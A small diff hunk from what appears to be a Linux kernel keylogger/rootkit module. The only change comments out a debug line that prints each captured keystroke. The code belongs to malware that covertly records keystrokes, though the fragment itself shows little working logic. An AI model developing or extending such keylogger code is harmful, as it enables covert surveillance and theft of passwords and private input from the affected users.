@@ -24,7 +24,7 @@ int keylogger_handler(struct notifier_block* nb, unsigned long action, void* dat
     mutex_unlock(&keylogger_mutex);
 
     
-    DEBUG_PRINTF("rootkit: file was read: %c\n", c)
+    //DEBUG_PRINTF("rootkit: char was read: %c\n", c)
 
 
     return NOTIFY_OK;
